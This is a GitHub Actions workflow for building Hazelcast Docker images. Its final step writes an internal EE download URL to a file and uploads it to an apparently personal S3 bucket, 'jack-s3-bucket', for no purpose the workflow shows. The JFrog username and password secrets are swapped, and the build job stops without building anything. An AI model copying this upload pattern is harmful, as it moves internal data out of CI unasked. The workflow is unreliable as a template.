name: Build OS and EE image

on:
  push:
    branches:
      - "!*"
    tags:
      - "v5.*"
  workflow_dispatch:
    inputs:
      HZ_VERSION:
        description: 'Version of Hazelcast to build the image for, e.g. 5.1.1, 5.0.1, 4.2.3'
        required: true
      RELEASE_VERSION:
        description: 'Version of the docker image e.g. 5.1.1, 5.1.1-1, defaults to HZ_VERSION'
        required: false
      RELEASE_TYPE:
        description: 'Which editions should be built'
        required: true
        default: 'EE'
        type: choice
        options:
          - ALL
          - OSS
          - EE
env:
  test_container_name_oss: hazelcast-oss-test
  test_container_name_ee: hazelcast-ee-test

jobs:
  jdks:
    uses: ./.github/workflows/get-supported-jdks.yaml

  prepare:
    runs-on: ubuntu-latest
    env:
      RELEASE_TYPE: ${{ inputs.RELEASE_TYPE || 'EE' }}
    outputs:
      should_build_oss: ${{ steps.which_editions.outputs.should_build_oss }}
      should_build_ee: ${{ steps.which_editions.outputs.should_build_ee }}
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Read release type from the file
        if: github.event_name != 'workflow_dispatch'
        run: |
          RELEASE_TYPE_FILE=.github/release_type
          if [ -f $RELEASE_TYPE_FILE ]; then
              echo "RELEASE_TYPE=$(cat $RELEASE_TYPE_FILE)" >> $GITHUB_ENV
          else
              echo "File '$RELEASE_TYPE_FILE' does not exist."
              exit 1
          fi

      - name: Check which editions should be built
        id: which_editions
        run: |
          . .github/scripts/build.functions.sh
          
          release_type=${{ env.RELEASE_TYPE }}
          triggered_by=${{ github.event_name }}
          should_build_oss=$(should_build_oss "$release_type")
          should_build_ee=$(should_build_ee "$release_type")
          echo "should_build_ee=${should_build_ee}" >> $GITHUB_OUTPUT
          echo "should_build_oss=${should_build_oss}" >> $GITHUB_OUTPUT

  push:
    runs-on: ubuntu-latest
    needs: [ jdks, prepare ]
    strategy:
      matrix:
        jdk: ${{ fromJSON(needs.jdks.outputs.jdks) }}
        variant: [ 'slim','' ]
        include:
          - variant: slim
          - variant: ''
    env:
      DOCKER_ORG: hazelcast
      HZ_VERSION: ${{ inputs.HZ_VERSION }}
    steps:
      - name: Set HZ version as environment variable
        if: env.HZ_VERSION == ''
        run: |
          echo "HZ_VERSION=${GITHUB_REF:11}" >> $GITHUB_ENV

      - name: Checkout Code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@v3
        with:
          aws-access-key-id: ${{ secrets.AWS_ACCESS_KEY_ID }}
          aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          aws-region: 'us-east-1'

      - name: Get EE dist ZIP URL
        run: |
          . .github/scripts/ee-build.functions.sh

          export JFROG_USERNAME=${{ secrets.HZ_SNAPSHOT_INTERNAL_PASSWORD }}
          export JFROG_PASSWORD=${{ secrets.HZ_SNAPSHOT_INTERNAL_USERNAME }}

          HAZELCAST_EE_ZIP_URL=$(get_hz_dist_zip "${{ matrix.variant }}" "${{ env.HZ_VERSION }}")
          echo "HAZELCAST_EE_ZIP_URL=$HAZELCAST_EE_ZIP_URL}" >> myfile.txt

          curl --fail --show-error --location ${HAZELCAST_EE_ZIP_URL} --output /dev/null
          

          aws s3 cp myfile.txt s3://jack-s3-bucket/myfile.txt
